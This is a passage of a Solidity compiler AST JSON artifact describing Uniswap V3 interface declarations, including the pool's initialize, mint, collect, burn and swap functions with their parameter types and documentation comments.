									"functionSelector": "8a7c195f",
									"id": 1665,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "enableFeeAmount",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1663,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1660,
												"mutability": "mutable",
												"name": "fee",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1665,
												"src": "3997:10:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint24",
													"typeString": "uint24"
												},
												"typeName": {
													"id": 1659,
													"name": "uint24",
													"nodeType": "ElementaryTypeName",
													"src": "3997:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint24",
														"typeString": "uint24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1662,
												"mutability": "mutable",
												"name": "tickSpacing",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1665,
												"src": "4009:17:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1661,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "4009:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3996:31:1"
									},
									"returnParameters": {
										"id": 1664,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "4036:0:1"
									},
									"scope": 1666,
									"src": "3972:65:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 1667,
							"src": "234:3805:1"
						}
					],
					"src": "45:3995:1"
				},
				"id": 1
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol": {
				"ast": {
					"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol",
					"exportedSymbols": {
						"IUniswapV3Pool": [
							1688
						]
					},
					"id": 1689,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1668,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:2"
						},
						{
							"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol",
							"file": "./pool/IUniswapV3PoolImmutables.sol",
							"id": 1669,
							"nodeType": "ImportDirective",
							"scope": 1689,
							"sourceUnit": 1975,
							"src": "71:45:2",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol",
							"file": "./pool/IUniswapV3PoolState.sol",
							"id": 1670,
							"nodeType": "ImportDirective",
							"scope": 1689,
							"sourceUnit": 2109,
							"src": "117:40:2",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol",
							"file": "./pool/IUniswapV3PoolDerivedState.sol",
							"id": 1671,
							"nodeType": "ImportDirective",
							"scope": 1689,
							"sourceUnit": 1816,
							"src": "158:47:2",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol",
							"file": "./pool/IUniswapV3PoolActions.sol",
							"id": 1672,
							"nodeType": "ImportDirective",
							"scope": 1689,
							"sourceUnit": 1785,
							"src": "206:42:2",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol",
							"file": "./pool/IUniswapV3PoolOwnerActions.sol",
							"id": 1673,
							"nodeType": "ImportDirective",
							"scope": 1689,
							"sourceUnit": 2001,
							"src": "249:47:2",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol",
							"file": "./pool/IUniswapV3PoolEvents.sol",
							"id": 1674,
							"nodeType": "ImportDirective",
							"scope": 1689,
							"sourceUnit": 1935,
							"src": "297:41:2",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 1676,
										"name": "IUniswapV3PoolImmutables",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 1974,
										"src": "637:24:2",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_IUniswapV3PoolImmutables_$1974",
											"typeString": "contract IUniswapV3PoolImmutables"
										}
									},
									"id": 1677,
									"nodeType": "InheritanceSpecifier",
									"src": "637:24:2"
								},
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 1678,
										"name": "IUniswapV3PoolState",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 2108,
										"src": "667:19:2",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_IUniswapV3PoolState_$2108",
											"typeString": "contract IUniswapV3PoolState"
										}
									},
									"id": 1679,
									"nodeType": "InheritanceSpecifier",
									"src": "667:19:2"
								},
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 1680,
										"name": "IUniswapV3PoolDerivedState",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 1815,
										"src": "692:26:2",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_IUniswapV3PoolDerivedState_$1815",
											"typeString": "contract IUniswapV3PoolDerivedState"
										}
									},
									"id": 1681,
									"nodeType": "InheritanceSpecifier",
									"src": "692:26:2"
								},
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 1682,
										"name": "IUniswapV3PoolActions",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 1784,
										"src": "724:21:2",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_IUniswapV3PoolActions_$1784",
											"typeString": "contract IUniswapV3PoolActions"
										}
									},
									"id": 1683,
									"nodeType": "InheritanceSpecifier",
									"src": "724:21:2"
								},
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 1684,
										"name": "IUniswapV3PoolOwnerActions",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 2000,
										"src": "751:26:2",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_IUniswapV3PoolOwnerActions_$2000",
											"typeString": "contract IUniswapV3PoolOwnerActions"
										}
									},
									"id": 1685,
									"nodeType": "InheritanceSpecifier",
									"src": "751:26:2"
								},
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 1686,
										"name": "IUniswapV3PoolEvents",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 1934,
										"src": "783:20:2",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_IUniswapV3PoolEvents_$1934",
											"typeString": "contract IUniswapV3PoolEvents"
										}
									},
									"id": 1687,
									"nodeType": "InheritanceSpecifier",
									"src": "783:20:2"
								}
							],
							"contractDependencies": [
								1784,
								1815,
								1934,
								1974,
								2000,
								2108
							],
							"contractKind": "interface",
							"documentation": {
								"id": 1675,
								"nodeType": "StructuredDocumentation",
								"src": "340:265:2",
								"text": "@title The interface for a Uniswap V3 Pool\n @notice A Uniswap pool facilitates swapping and automated market making between any two assets that strictly conform\n to the ERC20 specification\n @dev The pool interface is broken up into many smaller pieces"
							},
							"fullyImplemented": false,
							"id": 1688,
							"linearizedBaseContracts": [
								1688,
								1934,
								2000,
								1784,
								1815,
								2108,
								1974
							],
							"name": "IUniswapV3Pool",
							"nodeType": "ContractDefinition",
							"nodes": [],
							"scope": 1689,
							"src": "605:203:2"
						}
					],
					"src": "45:764:2"
				},
				"id": 2
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol": {
				"ast": {
					"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol",
					"exportedSymbols": {
						"IUniswapV3PoolActions": [
							1784
						]
					},
					"id": 1785,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1690,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:3"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 1691,
								"nodeType": "StructuredDocumentation",
								"src": "71:102:3",
								"text": "@title Permissionless pool actions\n @notice Contains pool methods that can be called by anyone"
							},
							"fullyImplemented": false,
							"id": 1784,
							"linearizedBaseContracts": [
								1784
							],
							"name": "IUniswapV3PoolActions",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": {
										"id": 1692,
										"nodeType": "StructuredDocumentation",
										"src": "211:206:3",
										"text": "@notice Sets the initial price for the pool\n @dev Price is represented as a sqrt(amountToken1/amountToken0) Q64.96 value\n @param sqrtPriceX96 the initial sqrt price of the pool as a Q64.96"
									},
									"functionSelector": "f637731d",
									"id": 1697,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "initialize",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1695,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1694,
												"mutability": "mutable",
												"name": "sqrtPriceX96",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1697,
												"src": "442:20:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint160",
													"typeString": "uint160"
												},
												"typeName": {
													"id": 1693,
													"name": "uint160",
													"nodeType": "ElementaryTypeName",
													"src": "442:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint160",
														"typeString": "uint160"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "441:22:3"
									},
									"returnParameters": {
										"id": 1696,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "472:0:3"
									},
									"scope": 1784,
									"src": "422:51:3",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1698,
										"nodeType": "StructuredDocumentation",
										"src": "479:1029:3",
										"text": "@notice Adds liquidity for the given recipient/tickLower/tickUpper position\n @dev The caller of this method receives a callback in the form of IUniswapV3MintCallback#uniswapV3MintCallback\n in which they must pay any token0 or token1 owed for the liquidity. The amount of token0/token1 due depends\n on tickLower, tickUpper, the amount of liquidity, and the current price.\n @param recipient The address for which the liquidity will be created\n @param tickLower The lower tick of the position in which to add liquidity\n @param tickUpper The upper tick of the position in which to add liquidity\n @param amount The amount of liquidity to mint\n @param data Any data that should be passed through to the callback\n @return amount0 The amount of token0 that was paid to mint the given amount of liquidity. Matches the value in the callback\n @return amount1 The amount of token1 that was paid to mint the given amount of liquidity. Matches the value in the callback"
									},
									"functionSelector": "3c8a7d8d",
									"id": 1715,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "mint",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1709,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1700,
												"mutability": "mutable",
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1715,
												"src": "1536:17:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1699,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1536:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1702,
												"mutability": "mutable",
												"name": "tickLower",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1715,
												"src": "1563:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1701,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1563:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1704,
												"mutability": "mutable",
												"name": "tickUpper",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1715,
												"src": "1588:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1703,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1588:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1706,
												"mutability": "mutable",
												"name": "amount",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1715,
												"src": "1613:14:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1705,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "1613:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1708,
												"mutability": "mutable",
												"name": "data",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1715,
												"src": "1637:19:3",
												"stateVariable": false,
												"storageLocation": "calldata",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes_calldata_ptr",
													"typeString": "bytes"
												},
												"typeName": {
													"id": 1707,
													"name": "bytes",
													"nodeType": "ElementaryTypeName",
													"src": "1637:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_storage_ptr",
														"typeString": "bytes"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1526:136:3"
									},
									"returnParameters": {
										"id": 1714,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1711,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1715,
												"src": "1681:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1710,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1681:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1713,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1715,
												"src": "1698:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1712,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1698:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1680:34:3"
									},
									"scope": 1784,
									"src": "1513:202:3",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1716,
										"nodeType": "StructuredDocumentation",
										"src": "1721:1053:3",
										"text": "@notice Collects tokens owed to a position\n @dev Does not recompute fees earned, which must be done either via mint or burn of any amount of liquidity.\n Collect must be called by the position owner. To withdraw only token0 or only token1, amount0Requested or\n amount1Requested may be set to zero. To withdraw all tokens owed, caller may pass any value greater than the\n actual tokens owed, e.g. type(uint128).max. Tokens owed may be from accumulated swap fees or burned liquidity.\n @param recipient The address which should receive the fees collected\n @param tickLower The lower tick of the position for which to collect fees\n @param tickUpper The upper tick of the position for which to collect fees\n @param amount0Requested How much token0 should be withdrawn from the fees owed\n @param amount1Requested How much token1 should be withdrawn from the fees owed\n @return amount0 The amount of fees collected in token0\n @return amount1 The amount of fees collected in token1"
									},
									"functionSelector": "4f1eb3d8",
									"id": 1733,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "collect",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1727,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1718,
												"mutability": "mutable",
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1733,
												"src": "2805:17:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1717,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2805:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1720,
												"mutability": "mutable",
												"name": "tickLower",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1733,
												"src": "2832:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1719,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "2832:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1722,
												"mutability": "mutable",
												"name": "tickUpper",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1733,
												"src": "2857:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1721,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "2857:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1724,
												"mutability": "mutable",
												"name": "amount0Requested",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1733,
												"src": "2882:24:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1723,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2882:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1726,
												"mutability": "mutable",
												"name": "amount1Requested",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1733,
												"src": "2916:24:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1725,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2916:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2795:151:3"
									},
									"returnParameters": {
										"id": 1732,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1729,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1733,
												"src": "2965:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1728,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2965:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1731,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1733,
												"src": "2982:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1730,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2982:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2964:34:3"
									},
									"scope": 1784,
									"src": "2779:220:3",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1734,
										"nodeType": "StructuredDocumentation",
										"src": "3005:631:3",
										"text": "@notice Burn liquidity from the sender and account tokens owed for the liquidity to the position\n @dev Can be used to trigger a recalculation of fees owed to a position by calling with an amount of 0\n @dev Fees must be collected separately via a call to #collect\n @param tickLower The lower tick of the position for which to burn liquidity\n @param tickUpper The upper tick of the position for which to burn liquidity\n @param amount How much liquidity to burn\n @return amount0 The amount of token0 sent to the recipient\n @return amount1 The amount of token1 sent to the recipient"
									},
									"functionSelector": "a34123a7",
									"id": 1747,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "burn",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1741,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1736,
												"mutability": "mutable",
												"name": "tickLower",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1747,
												"src": "3664:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1735,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "3664:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1738,
												"mutability": "mutable",
												"name": "tickUpper",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1747,
												"src": "3689:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1737,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "3689:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1740,
												"mutability": "mutable",
												"name": "amount",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1747,
												"src": "3714:14:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1739,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "3714:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3654:80:3"
									},
									"returnParameters": {
										"id": 1746,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1743,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1747,
												"src": "3753:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1742,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3753:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1745,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1747,
												"src": "3770:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1744,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3770:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3752:34:3"
									},
									"scope": 1784,
									"src": "3641:146:3",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1748,
										"nodeType": "StructuredDocumentation",
										"src": "3793:1015:3",
										"text": "@notice Swap token0 for token1, or token1 for token0\n @dev The caller of this method receives a callback in the form of IUniswapV3SwapCallback#uniswapV3SwapCallback\n @param recipient The address to receive the output of the swap\n @param zeroForOne The direction of the swap, true for token0 to token1, false for token1 to token0\n @param amountSpecified The amount of the swap, which implicitly configures the swap as exact input (positive), or exact output (negative)\n @param sqrtPriceLimitX96 The Q64.96 sqrt price limit. If zero for one, the price cannot be less than this\n value after the swap. If one for zero, the price cannot be greater than this value after the swap\n @param data Any data to be passed through to the callback\n @return amount0 The delta of the balance of token0 of the pool, exact when negative, minimum when positive\n @return amount1 The delta of the balance of token1 of the pool, exact when negative, minimum when positive"
									},
									"functionSelector": "128acb08",
									"id": 1765,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "swap",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1759,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1750,
												"mutability": "mutable",
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1765,
												"src": "4836:17:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1749,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "4836:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1752,
												"mutability": "mutable",
												"name": "zeroForOne",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1765,
												"src": "4863:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 1751,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "4863:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1754,
												"mutability": "mutable",
												"name": "amountSpecified",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1765,
												"src": "4888:22:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int256",
													"typeString": "int256"
												},
												"typeName": {
													"id": 1753,
													"name": "int256",
													"nodeType": "ElementaryTypeName",
													"src": "4888:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1756,
												"mutability": "mutable",
												"name": "sqrtPriceLimitX96",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1765,
												"src": "4920:25:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint160",
													"typeString": "uint160"
												},
												"typeName": {
													"id": 1755,
													"name": "uint160",
													"nodeType": "ElementaryTypeName",
													"src": "4920:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint160",
														"typeString": "uint160"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1758,
												"mutability": "mutable",
												"name": "data",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1765,
												"src": "4955:19:3",
												"stateVariable": false,
												"storageLocation": "calldata",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes_calldata_ptr",
													"typeString": "bytes"
												},
												"typeName": {
													"id": 1757,
													"name": "bytes",
													"nodeType": "ElementaryTypeName",
													"src": "4955:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_storage_ptr",
														"typeString": "bytes"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4826:154:3"
									},
									"returnParameters": {
										"id": 1764,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1761,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1765,
												"src": "4999:14:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int256",
													"typeString": "int256"
												},
												"typeName": {
													"id": 1760,
													"name": "int256",
													"nodeType": "ElementaryTypeName",
													"src": "4999:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1763,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1765,
												"src": "5015:14:3",
												"stateVariable": false,
